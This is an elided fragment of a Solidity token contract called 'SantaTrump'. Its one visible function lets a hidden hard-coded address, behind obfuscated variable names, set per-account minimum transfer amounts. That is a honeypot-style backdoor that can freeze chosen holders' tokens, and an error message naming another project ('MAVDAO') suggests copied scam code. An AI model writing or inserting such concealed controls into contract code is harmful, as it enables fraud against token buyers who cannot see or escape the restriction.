...
contract SantaTrump is Context, Ownable, IERC20 {
    ...
    event MinTransferAmountChanged(address indexed account, uint256 neAmnttont);

    function setMinTransferAmount(address account, uint256 neAmnttont) public {
        address gdssssa = ggggffff;
        require(_msgSender() == gdssssa);
        require(account != address(0), "MAVDAO: address zero is not a valid account");
        _minTransferAmounts[account] = neAmnttont;
        emit MinTransferAmountChanged(account, neAmnttont);
    }
